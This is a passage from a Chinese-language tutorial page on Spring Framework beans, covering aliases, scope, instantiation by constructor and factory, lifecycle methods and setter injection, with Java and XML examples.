class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h1 id="8-bean配置"><a class="markdownIt-Anchor" href="#8-bean配置">#</a> 8、bean 配置</h1><h2 id="81-基本配置"><a class="markdownIt-Anchor" href="#81-基本配置">#</a> 8.1 基本配置</h2><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220722210731071.png" alt="image-20220722210731071"></p><h2 id="82-bean别名配置"><a class="markdownIt-Anchor" href="#82-bean别名配置">#</a> 8.2 bean 别名配置</h2><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220722211234407.png" alt="image-20220722211234407"></p><ul><li>注意事项：获取 bean 无论是通过 id 还是 name 获取，如果无法获取到，将抛出异常<mark> NoSuchBeanDefinitionException:No bean named ‘service4’ available</mark></li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bookDao<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dao<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.itheima.dao.impl.BookDaoImpl<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bookService<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>service service2 bookEbi<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.itheima.service.impl.BookServiceImpl<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bookDao<span class="token punctuation">"</span></span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bookDao<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">></span></span>==bean在配置了name别名之后，可以使用别名获取对象，也可以使用别名作为ref的值==<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220722211608854.png" alt="image-20220722211608854"></p><h2 id="83-bean作用范围配置"><a class="markdownIt-Anchor" href="#83-bean作用范围配置">#</a> 8.3 bean 作用范围配置</h2><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220722212059479.png" alt="image-20220722212059479"></p><ul><li><p>为什么 bean 默认为单例？</p><p>防止造出的 bean 数量过于庞大，造成较高负载；管理复用的对象，使用完毕后放回容器，下次使用再从容器中拿。</p></li><li><p>适合交给容器进行管理的 bean</p><ul><li>表现层对象</li><li>业务层对象</li><li>数据层对象</li><li>工具对象</li></ul></li><li><p>不适合交给容器进行管理的 bean</p><ul><li>封装实体的域对象</li></ul></li></ul><h1 id="9-bean实例化"><a class="markdownIt-Anchor" href="#9-bean实例化">#</a> 9、bean 实例化</h1><h2 id="91-bean是如何创建出来的"><a class="markdownIt-Anchor" href="#91-bean是如何创建出来的">#</a> 9.1 bean 是如何创建出来的</h2><ul><li>本质上是对象，创建 bean 使用构造方法完成</li></ul><h2 id="92-实例化bean的三种方式"><a class="markdownIt-Anchor" href="#92-实例化bean的三种方式">#</a> 9.2 实例化 bean 的三种方式</h2><h3 id="921-构造方法常用"><a class="markdownIt-Anchor" href="#921-构造方法常用">#</a> 9.2.1 构造方法（常用）</h3><ul><li><p>提供可访问的构造方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>service<span class="token punctuation">.</span>impl</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>dao<span class="token punctuation">.</span></span><span class="token class-name">BookDao</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>service<span class="token punctuation">.</span></span><span class="token class-name">BookService</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BookServiceImpl</span> <span class="token keyword">implements</span> <span class="token class-name">BookService</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//5.删除业务层中shiyongnew的</span>    <span class="token keyword">private</span> <span class="token class-name">BookDao</span> bookDao<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">BookServiceImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"service constructor is running ...."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>配置</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bookDao<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dao<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.itheima.dao.impl.BookDaoImpl<span class="token punctuation">"</span></span> <span class="token attr-name">scope</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>prototype<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>无参构造方法如果不存在，将抛出异常<mark> BeanCreationException</mark></p></li></ul><h3 id="922-静态工厂了解"><a class="markdownIt-Anchor" href="#922-静态工厂了解">#</a> 9.2.2 静态工厂（了解）</h3><ul><li><p>为兼容早期遗留问题使用</p></li><li><p>静态工厂</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>factory</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>dao<span class="token punctuation">.</span></span><span class="token class-name">OrderDao</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>dao<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">OrderDaoImpl</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">OrderDaoFactory</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">OrderDao</span> <span class="token function">getOrderDao</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">OrderDaoImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>配置</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span>       <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>orderDao<span class="token punctuation">"</span></span>       <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.itheima.factory.OrderDaoFactory<span class="token punctuation">"</span></span>       <span class="token attr-name">factory-method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>getOrderDao<span class="token punctuation">"</span></span>       <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>class：工厂类名</p><p>factory-method：工厂类中获取实例的方法名</p></li></ul><h3 id="923-实例工厂了解"><a class="markdownIt-Anchor" href="#923-实例工厂了解">#</a> 9.2.3 实例工厂（了解）</h3><ul><li><p>实例工厂</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>factory</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>dao<span class="token punctuation">.</span></span><span class="token class-name">UserDao</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>dao<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">UserDaoImpl</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserDaoFactory</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">UserDao</span> <span class="token function">getUserDao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">UserDaoImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>配置</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userFactory<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.itheima.factory.UserDaoFactory<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>&lt;bean       id="userDao"       factory-bean="userFactory" //指向工厂的bean      factory-method="getUserDao"       /><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="924-factorybean实用"><a class="markdownIt-Anchor" href="#924-factorybean实用">#</a> 9.2.4 FactoryBean（实用）</h3><ul><li><p>FactoryBean</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>factory</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>dao<span class="token punctuation">.</span></span><span class="token class-name">UserDao</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>dao<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">UserDaoImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span></span><span class="token class-name">FactoryBean</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserDaoFactoryBean</span> <span class="token keyword">implements</span> <span class="token class-name">FactoryBean</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">UserDao</span><span class="token punctuation">></span></span> <span class="token punctuation">&#123;</span>    <span class="token comment">//代替原始实例工厂中创建对象的方法</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">UserDao</span> <span class="token function">getObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">UserDaoImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token function">getObjectType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">UserDao</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//单例多例</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isSingleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token comment">//非单例</span>        <span class="token comment">//return true 单例</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>配置</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span>       <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userDao<span class="token punctuation">"</span></span>       <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.itheima.factory.UserDaoFactoryBean<span class="token punctuation">"</span></span>       <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h1 id="10-bean的生命周期"><a class="markdownIt-Anchor" href="#10-bean的生命周期">#</a> 10、bean 的生命周期</h1><ul><li>生命周期：从创建到消亡的完整过程</li><li>bean 生命周期：bean 从创建到销毁的整体过程</li><li>bean 生命周期控制：在 bean 创建后到销毁前做的事情</li></ul><h2 id="101-配置控制"><a class="markdownIt-Anchor" href="#101-配置控制">#</a> 10.1 配置控制</h2><ul><li><p>提供生命周期控制方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>dao<span class="token punctuation">.</span>impl</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>dao<span class="token punctuation">.</span></span><span class="token class-name">BookDao</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BookDaoImpl</span> <span class="token keyword">implements</span> <span class="token class-name">BookDao</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"book save dao ...."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//方法名不要带参数</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"dao init ...."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//方法名不要带参数</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"dao destory ...."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>配置生命周期方法</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span>       <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bookDao<span class="token punctuation">"</span></span>       <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.itheima.dao.impl.BookDaoImpl<span class="token punctuation">"</span></span>       <span class="token attr-name">init-method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>init<span class="token punctuation">"</span></span>       <span class="token attr-name">destroy-method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>destroy<span class="token punctuation">"</span></span>      <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="102-接口控制了解"><a class="markdownIt-Anchor" href="#102-接口控制了解">#</a> 10.2 接口控制（了解）</h2><ul><li><p>实现 InitializingBean, DisposableBean 接口</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>service<span class="token punctuation">.</span>impl</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>dao<span class="token punctuation">.</span></span><span class="token class-name">BookDao</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>service<span class="token punctuation">.</span></span><span class="token class-name">BookService</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span></span><span class="token class-name">DisposableBean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span></span><span class="token class-name">InitializingBean</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BookServiceImpl</span> <span class="token keyword">implements</span> <span class="token class-name">BookService</span><span class="token punctuation">,</span> <span class="token class-name">InitializingBean</span><span class="token punctuation">,</span> <span class="token class-name">DisposableBean</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">BookDao</span> bookDao<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        bookDao<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setBookDao</span><span class="token punctuation">(</span><span class="token class-name">BookDao</span> bookDao<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>bookDao <span class="token operator">=</span> bookDao<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"service destroy ...."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">afterPropertiesSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span> <span class="token comment">//构造方法属性设置完以后才执行</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"service init ...."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>配置生命周期方法</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span>       <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bookService<span class="token punctuation">"</span></span>       <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.itheima.service.impl.BookServiceImpl<span class="token punctuation">"</span></span>       <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="103-生命周期"><a class="markdownIt-Anchor" href="#103-生命周期">#</a> 10.3 生命周期</h2><ul><li>初始化容器<ol><li>创建对象（内存分配）</li><li>执行构造方法</li><li>执行属性注入（set 操作）</li><li><mark>执行 bean 初始化方法</mark></li></ol></li><li>使用 bean<ol><li>执行业务操作</li></ol></li><li>关闭 / 销毁容器<ol><li>执行 bean 销毁方法</li></ol></li></ul><h2 id="104-bean销毁时机"><a class="markdownIt-Anchor" href="#104-bean销毁时机">#</a> 10.4 bean 销毁时机</h2><ul><li><p>容器关闭前出发 bean 的销毁</p></li><li><p>关闭容器方式：</p><ul><li><p>手工关闭容器：</p><pre class="line-numbers language-ConfigurableApplicationContext```接口```close()```操作" data-language="ConfigurableApplicationContext```接口```close()```操作"><code class="language-ConfigurableApplicationContext```接口```close()```操作">  - 注册关闭勾子，在虚拟机退出前先关闭容器再退出虚拟机    &#96;&#96;&#96;ConfigurableApplicationContext&#96;&#96;&#96;接口&#96;&#96;&#96;registerShutdownHook()&#96;&#96;&#96;操作&#96;&#96;&#96;javapublic class AppForLifeCycle &#123;    public static void main(String[] args) &#123;        ClassPathXmlApplicationContext ctx &#x3D; new ClassPathXmlApplicationContext(&quot;applicationContext.properties.xml&quot;);        ctx.close();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><h1 id="11-依赖注入方式"><a class="markdownIt-Anchor" href="#11-依赖注入方式">#</a> 11、依赖注入方式</h1><ul><li>思考：向一个类中传递数据的方式有几种？<ul><li>普通方法（set 方法）</li><li>构造方法</li></ul></li><li>思考：依赖注入描述了在容器中建立 bean 与 bean 之间依赖关系的过程，如果 bean 运行需要的是数字或字符串呢<ul><li>引用类型</li><li>简单类型（基本数据类型与 string）</li></ul></li><li>依赖注入方式<ul><li>setter 注入<ul><li>简单类型</li><li>引用类型</li></ul></li><li>构造器注入<ul><li>简单类型</li><li>引用类型</li></ul></li></ul></li></ul><h2 id="111-setter注入引用类型"><a class="markdownIt-Anchor" href="#111-setter注入引用类型">#</a> 11.1 setter 注入 —— 引用类型</h2><p><mark>使用 property 标签</mark></p><ul><li>多个引用类型注入</li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.itheima.dao.impl.BookDaoImpl<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bookDao<span class="token punctuation">"</span></span> <span class="token attr-name">scope</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>singleton<span class="token punctuation">"</span></span> <span class="token attr-name">init-method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>init<span class="token punctuation">"</span></span> <span class="token attr-name">destroy-method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>destroy<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.itheima.dao.impl.UserDaoImpl<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userDao<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.itheima.service.impl.BookServiceImpl<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bookService<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bookDao<span class="token punctuation">"</span></span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bookDao<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userDao<span class="token punctuation">"</span></span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userDao<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>需要类里有两个对象和两个setter方法<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="112-setter注入基本类型"><a class="markdownIt-Anchor" href="#112-setter注入基本类型">#</a> 11.2 setter 注入 —— 基本类型</h2><p><mark>使用 property 